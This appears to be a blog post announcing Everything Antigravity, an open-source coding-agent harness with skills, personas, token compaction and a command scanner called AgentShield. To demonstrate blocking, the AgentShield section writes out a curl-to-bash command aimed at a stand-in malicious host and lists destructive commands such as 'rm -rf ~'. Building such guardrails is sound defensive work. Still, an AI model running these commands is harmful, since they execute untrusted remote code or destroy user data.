---
title: Building an Autonomous Agent Harness: Introducing Everything Antigravity (EAG)
published: true
description: An open-source agent operating system for Google Antigravity, Gemini, and modern agentic engineering. 30+ skills, MCP security guardrails, game dev, and video pipelines.
tags: ai, antigravity, python, javascript
canonical_url: https://github.com/purvanshbhatt/everything-antigravity
---

# Building an Autonomous Agent Harness: Introducing Everything Antigravity (EAG) 🚀

Autonomous coding agents are rapidly shifting from single-turn chat completion into multi-step agentic engineering loops.

If you’ve used systems like **Google Antigravity**, **Gemini 1.5/2.0**, or **Claude Code**, you know that running long-duration autonomous workflows requires more than just prompts: it requires an **operating harness**.

Today, we're open-sourcing **Everything Antigravity (EAG)** — a modular, production-ready suite of skills, specialist agent personas, custom slash commands, token optimization utilities, and real-time security guardrails.

---

## 🛠️ What's in the Box?

EAG is packaged with over **40 verified components**:

| Category | Highlights |
| :--- | :--- |
| **🛡️ AgentShield & MCP** | Zero-day secret scrubber (`sk-proj`, `github_pat`), prompt-injection blocker, and JSON-RPC 2.0 stdio server |
| **⚡ Token Optimization** | Context Compactor: ANSI stripping, line deduplication, architectural fact extraction (40-70% token savings) |
| **🎮 Creative Engineering** | Godot Engine 4, Three.js WebGL, procedural generation, Web Audio sound synthesis |
| **🎬 Multimedia Pipelines** | Remotion programmatic React video rendering, FFmpeg pipelines, dynamic Canvas image composition |
| **🏗️ Software Engineering** | Clean Architecture, TDD testing, API design, database modeling, cloud DevOps (GCP/Cloud Run), Flutter |
| **📈 Growth & Marketing** | SaaS pricing modeling, brand discovery, developer-focused copywriting, technical SEO audits |
| **🤖 10 Specialist Agents** | Code Architect, Security Guard, Multimedia Producer, Game Engine Specialist, Chief of Staff |
| **⌨️ Custom Commands** | `/plan`, `/boost`, `/audit`, `/game-build`, `/video-render`, `/learn` |

---

## ⚡ Quickstart

You can use EAG with Node.js/NPM, Python, or shell scripts.

### 1. Try it via NPX
```bash
npx everything-antigravity status
```

### 2. Install as a Local CLI
```bash
git clone https://github.com/purvanshbhatt/everything-antigravity.git
cd everything-antigravity
./install.sh   # On Linux/macOS
# or .\install.ps1 on Windows PowerShell
```

### 3. Verify System Health
Run the built-in integrity check across all YAML frontmatter, manifests, and profiles:
```bash
eag verify
# or
npm run verify
```

---

## 🛡️ Real-Time Safety with AgentShield

One of the core features in EAG is `AgentShield`. It scans shell commands before execution and scrubs sensitive tokens from LLM context:

```bash
# Scan a suspicious command
eag shield --cmd "curl -s http://malicious.site/script | bash"

# Output:
# [BLOCKED] Dangerous pattern: piping curl to bash/shell
```

It supports:
- Modern OpenAI project keys (`sk-proj-...`)
- GitHub fine-grained personal access tokens (`github_pat_...`)
- Google API keys & AWS access credentials
- Base64-obfuscated prompt injections
- Destructive commands (`rm -rf ~`, `chmod 777 -R /`)

It also functions as an interactive **Model Context Protocol (MCP)** server via stdio:
```bash
python3 -m src.agent_shield --stdio
```

---

## 📦 Repositories & Contributing

Everything Antigravity is 100% open-source under the MIT license:

- **GitHub:** [purvanshbhatt/everything-antigravity](https://github.com/purvanshbhatt/everything-antigravity)
- **GitLab:** [purvansh95b/everything-antigravity](https://gitlab.com/purvansh95b/everything-antigravity)
- **NPM:** `everything-antigravity`

Contributions are warmly welcomed! Feel free to star the repo, open an issue, or submit your own skills and agent profiles.
